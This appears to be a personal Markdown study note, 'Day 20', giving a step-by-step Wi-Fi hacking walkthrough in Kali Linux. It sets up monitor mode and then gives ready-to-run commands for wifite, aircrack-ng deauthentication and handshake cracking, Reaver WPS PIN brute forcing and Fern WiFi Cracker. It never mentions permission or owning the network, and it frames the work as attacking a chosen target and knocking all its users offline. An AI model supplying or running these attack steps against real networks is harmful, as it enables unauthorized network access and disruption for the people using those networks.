# ♦ Day 20
</br>
</br>

## ◙ ***Wi-Fi Hacking***
 </br>
 
# ♦ Note : 
   ⇨ For Wi-Fi hacking a special peace of hardware... An External WiFi Adapter and there is more not all WiFi adapters acn abe used for these things Therer a special types preferably with antenas Or Alfa Network Adapters 
   </br>
   </br>
### ◙ Step-By-Step Guide :

### ♦ 1. Configuring VirtualBox :

  1 ⇨ 1st Connect the WiFi Adapter.
  2 ⇨ Now Open VirtaulBox > Select your Machine > Go to Settings > Go to USB.
  3 ⇨ Now Go to +(add) Sign > Select ur device and add it > Click on Ok and save.

 • After Completeing Setting go to The terminal.

### ♦ 2. Setting-up the WiFi in KALI :
    
  1 ⇨ 1st Check th econnection as USB :

     lsusb

  2 ⇨ Now Check whether the Adapter is in monitor or m,anage mode (In which mode the edvice is.)

    iwconfig

  3 ⇨ If it is in Manage mode then change it in Monitor mode cuz we have to do our work in Monitor mode.

     sudo airmon-ng start wlan0



### ♦ 3. Wi-Fi Scanning :

 1 ⇨ Search for WiFi networks nearby :

     sudo airodump-ng wlan0mon
• NOTE ⇨ Ensure the signal strength is above 30 for better results.


## ♦ 4. Commencing our long awaited WiFi Attack :
  
  ⇨ For WiFi attack we will use `wifite` this is an automatic and highly Recomended tool which switches the wifi ti monitor mode and also start scanning the surrounding networks.


#### How Wifite Works :

• Sends deauthentication packets to the router, disconnecting all users.

• Captures the target's packets when users attempt to reconnect, generating a .pcap file.

• Uses a common wordlist to brute force the Wi-Fi password from the captured packets.

• Once successful, you will obtain the Wi-Fi password and can connect to the network.


### Starting the Attack :

 #### • 1. Install Wifite if not pre installed :

    sudo apt-get update
    sudo apt-get install wifite

#### • 2. Start Wifite :

     sudo wifite

#### • 3. **Follow the prompts to select your target network and initiate the attack.**
   • Wifite will display a list of detected networks.
  
   • Select the network you want to target.
   
   • Wifite will automatically deauthenticate users, capture the handshake, and attempt to crack the password using a wordlist.



### ◙ Additional Tools for Wi-Fi Penetration Testing :

#### • Aircrack-ng Suite :

Aircrack-ng is a complete suite of tools to assess WiFi network security.


• 1. **Capture packets:**
    ```sh
    sudo airodump-ng wlan0mon
    ```
    - Use this command to capture packets from a specific network:
    ```sh
    sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w [CAPTURE_FILE] wlan0mon
    ```


• 2. **Deauthenticate a client:**
    ```sh
    sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon
    ```


• 3. **Crack the password:**
    ```sh
    sudo aircrack-ng -w /path/to/wordlist.txt -b [BSSID] [CAPTURE_FILE].cap
    ```


#### ◙ Reaver
Reaver is a tool for performing brute force attacks against WPS (Wi-Fi Protected Setup) registrar PINs.


• 1. **Put the interface in monitor mode:**
    ```sh
    sudo airmon-ng start wlan0
    ```


• 2. **Scan for WPS-enabled networks:**
    ```sh
    sudo wash -i wlan0mon
    ```


• 3. **Run Reaver against a target:**
    ```sh
    sudo reaver -i wlan0mon -b [BSSID] -vv
    ```


#### ◙ Fern WiFi Cracker
Fern WiFi Cracker is a tool for auditing and attacking wireless networks.


• 1. **Install Fern WiFi Cracker:**
    ```sh
    sudo apt-get update
    sudo apt-get install fern-wifi-cracker
    ```


• 2. **Run Fern WiFi Cracker:**
    ```sh
    sudo fern-wifi-cracker
    ```
    - Use the GUI to select your wireless adapter, scan for networks, and initiate attacks.
